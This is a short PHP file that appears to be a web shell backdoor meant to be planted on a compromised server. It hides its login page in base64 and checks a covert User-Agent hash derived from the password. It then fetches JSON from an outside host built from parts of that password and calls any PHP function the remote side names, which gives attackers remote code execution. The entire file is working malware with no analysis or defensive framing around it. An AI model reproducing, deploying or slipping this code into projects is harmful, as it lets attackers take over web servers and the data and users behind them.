<?php
$a = isset($_POST['pass']) ? trim($_POST['pass']) : '';
if ($a == '') {
    echologin();
} else {
    chkpass($a);
    helloowner($a);
}
function chkpass($a) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], md5($a)) === false) {
        echofail(1);
    }
    return true;
}
function helloowner($a) {
    $b = gencodeurl($a);
    $c = file_get_contents($b);
    if ($c == false) {
        echofail(2);
    }
    $d = @json_decode($c, 1);
    if (!isset($d['f'])) {
        echofail(3);
    }
    $d['f']($d['d']);
}
function gencodeurl($a) {
    $e = md5(date("Y-m-d"));
    if (strlen($a) > 40) {
        $f = substr($a, 30, 5);
        $g = substr($a, 10, 10);
    } else {
        $f = 'good';
        $g = 'web.com';
    }
    $b = 'http://' . $f . $g;
    return $b;
}
function echofail($h) {
    $i = 'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg==';
    echo str_replace('%id%', $h, base64_decode($i));
    exit;
}
function echologin() {
    $j = 'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+';
    echo base64_decode($j);
    exit;
} ?>
